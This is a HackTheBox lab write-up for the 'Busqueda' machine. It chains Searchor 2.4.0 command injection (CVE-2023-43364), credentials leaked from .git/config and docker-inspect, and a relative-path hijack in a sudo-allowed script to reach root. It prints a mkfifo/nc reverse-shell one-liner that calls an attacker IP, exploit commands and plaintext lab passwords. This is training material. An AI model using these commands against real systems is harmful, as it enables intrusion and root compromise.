---
title: "HTB: Busqueda"
date: 2026-04-15
draft: false
categories: ["writeup"]
tags:
  - hackthebox
  - linux
  - easy
  - cve-2023-43364
  - command-injection
  - python
  - gitea
  - docker
  - sudo-abuse
  - relative-path-hijack
description: "Searchor 2.4.0 command injection leads to svc, then a relative path in a sudo-allowed Python script drops root."
summary: "Searchor 2.4.0 command injection leads to svc, then a relative path in a sudo-allowed Python script drops root."
cover:
  image: "/images/htb-busqueda/info-card.png"
  alt: "HTB Busqueda"
  relative: false
showToc: true
TocOpen: false
---

| Field      | Info    |
|------------|---------|
| OS         | Linux   |
| Difficulty | Easy    |
| Release    | 2023    |

### Kill Chain

| Step | Action | Result |
|------|--------|--------|
| 1 | nmap scan | Ports 22, 80 open; redirects to `searcher.htb` |
| 2 | Browse web app | Searchor 2.4.0 identified in page footer |
| 3 | CVE-2023-43364 exploit | RCE via eval injection, shell as `svc` |
| 4 | Read `.git/config` | Credentials `cody:jh1usoih2bkjaspwe92` and vhost `gitea.searcher.htb` |
| 5 | SSH as svc (password reuse) | Stable shell, `sudo -l` reveals `system-checkup.py *` |
| 6 | `docker-inspect` subcommand | Leaks gitea admin password `yuiu1hoiu4i5ho1uh` |
| 7 | Gitea as administrator | Read `system-checkup.py` source, spot relative path in `full-checkup` |
| 8 | Drop malicious `full-checkup.sh` in `/tmp` | `sudo system-checkup.py full-checkup` executes it as root |
| 9 | Reverse shell catches | Root shell on Busqueda |

---

### Credentials

| User | Password | Source |
|------|----------|--------|
| cody | jh1usoih2bkjaspwe92 | `.git/config` remote URL |
| svc | jh1usoih2bkjaspwe92 | Password reuse from cody |
| administrator | yuiu1hoiu4i5ho1uh | `docker-inspect` gitea env vars |

---

## Recon

### nmap

A quick full-port sweep to see what's exposed, followed by a service scan on the hits.

**Kali:**
```console
$ nmap -p- --min-rate 8000 10.129.228.217
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

**Kali:**
```console
$ nmap -p 22,80 -sC -sV 10.129.228.217
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nothing exotic. SSH is there as a fallback. The web server redirects to `searcher.htb`, so I add that to `/etc/hosts` and go check the site.

---

## Shell as svc

### Searchor 2.4.0

The app is a search aggregator. Pick an engine, type a query, hit Search. Standard enough. What catches my eye is the footer.

![Searchor 2.4.0 in page footer](/images/htb-busqueda/searcher-homepage.png)

Searchor 2.4.0. That version number maps directly to CVE-2023-43364, a command injection through Python's `eval()` in the search query handler. The fix landed in 2.4.2 so this build is wide open.

### CVE-2023-43364

The vulnerability is in how Searchor constructs the search URL. User input gets passed into an `eval()` call without sanitization, so you can break out of the string context and inject arbitrary Python. A crafted query becomes shell execution.

I grabbed the PoC from [nikn0laty](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection) and set up a listener.

**Kali:**
```console
$ git clone https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection.git
$ cd Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection
$ chmod +x exploit.sh
```

**Kali:**
```console
$ nc -lvnp 9001
```

**Kali:**
```console
$ ./exploit.sh searcher.htb 10.10.15.150
```

Shell lands immediately. I upgrade to a proper PTY.

**Target (svc):**
```console
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
$ stty raw -echo; fg
$ export TERM=xterm
```

![Initial shell as svc](/images/htb-busqueda/initial-shell-svc.png)

Running as `svc` inside `/var/www/app`.

### user.txt

**Target (svc):**
```console
$ cat ~/user.txt
e097ad0e************************
```

![user.txt flag](/images/htb-busqueda/user-flag.png)

---

## Shell as root

### Git Config Leak

Before reaching for LinPEAS I poke around the app directory. There's a `.git` folder sitting in `/var/www/app`, which means the app is tracked in version control. Git config files often store credentials in the remote URL.

**Target (svc):**
```console
$ ls -la /var/www/app
drwxr-xr-x 4 www-data www-data 4096 Apr  3 2023 .
drwxr-xr-x 4 root     root     1124 Dec  1 2022 ..
drwxrwxr-x 8 www-data www-data 4096 Apr 15 08:06 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1 2022 templates
```

![App directory with .git folder](/images/htb-busqueda/app-directory-listing.png)

**Target (svc):**
```console
$ cat /var/www/app/.git/config
```

![.git/config revealing cody credentials and gitea vhost](/images/htb-busqueda/git-config-credentials.png)

The remote URL is `http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git`. Two things immediately useful: credentials for user `cody` and a new virtual host `gitea.searcher.htb`. I add that to `/etc/hosts`.

Worth trying the password against SSH too since credential reuse is common on easy boxes. It works.

**Kali:**
```console
$ ssh svc@searcher.htb
```

Stable shell as `svc` now.

### Sudo Enumeration

**Target (svc):**
```console
$ sudo -l
```

![sudo -l output showing system-checkup.py](/images/htb-busqueda/sudo-l-output.png)

`svc` can run `/usr/bin/python3 /opt/scripts/system-checkup.py *` as root with no password. The wildcard means any argument. Let me see what this script actually does.

**Target (svc):**
```console
$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
```

![system-checkup.py usage menu](/images/htb-busqueda/system-checkup-usage.png)

Three subcommands: `docker-ps`, `docker-inspect`, and `full-checkup`. I start with `docker-ps` to see what's running.

### Docker Enumeration

**Target (svc):**
```console
$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
```

![docker-ps output showing gitea and mysql containers](/images/htb-busqueda/docker-ps-output.png)

Two containers: `gitea` and `mysql_db`. The `docker-inspect` subcommand looks interesting. Running it without arguments shows the required syntax.

**Target (svc):**
```console
$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
```

![docker-inspect usage](/images/htb-busqueda/docker-inspect-usage.png)

`docker inspect` accepts Go template format strings to pull specific fields out of container metadata. Passing `{{json .}}` dumps everything and piping through `jq` makes it readable.

**Target (svc):**
```console
$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq
```

![docker-inspect gitea env vars showing admin password](/images/htb-busqueda/docker-inspect-gitea-env.png)

The Gitea container's environment variables include `GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh`. That's the database password, but it's also likely the admin account password.

### Gitea Access

I navigate to `http://gitea.searcher.htb`. The familiar Gitea interface greets me.

![Gitea login page](/images/htb-busqueda/gitea-login-page.png)

First I log in as `cody` using the credentials from the git config.

![Gitea logged in as cody, administrator visible in activity feed](/images/htb-busqueda/gitea-cody-dashboard.png)

The activity feed shows an `administrator` account. I try `administrator:yuiu1hoiu4i5ho1uh` and it works.

![Gitea logged in as administrator](/images/htb-busqueda/gitea-administrator-dashboard.png)

Administrator owns a `scripts` repository. That's almost certainly where `system-checkup.py` lives.

### Source Code Review

![administrator/scripts repository listing](/images/htb-busqueda/gitea-scripts-repo.png)

The repo has `system-checkup.py` along with a few other files. I open the script and look at how `full-checkup` is implemented.

![system-checkup.py full-checkup code using relative path](/images/htb-busqueda/system-checkup-full-checkup-code.png)

The relevant snippet:

```python
elif action == 'full-checkup':
    try:
        arg_list = ['./full-checkup.sh']
        print(run_command(arg_list))
        print('[+] Done!')
    except:
        print('Something went wrong')
        exit(1)
```

It calls `./full-checkup.sh` as a relative path. When Python runs this, `./` resolves relative to the current working directory, not the script's location. If I run `sudo system-checkup.py full-checkup` from `/tmp` where I've planted my own `full-checkup.sh`, it'll execute my file as root.

### Relative Path Hijack

I write a reverse shell script to `/tmp/full-checkup.sh` and set up a listener.

**Target (svc):**
```console
$ echo -en "#! /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.150 9001 >/tmp/f" > /tmp/full-checkup.sh
$ cd /tmp
$ chmod +x full-checkup.sh
```

**Kali:**
```console
$ nc -lvnp 9001
```

**Target (svc):**
```console
$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

![Root shell - whoami shows root](/images/htb-busqueda/root-shell.png)

Root shell.

### root.txt

**Target (root):**
```console
# cat /root/root.txt
8eaf4ccd************************
```

![root.txt flag](/images/htb-busqueda/root-flag.png)
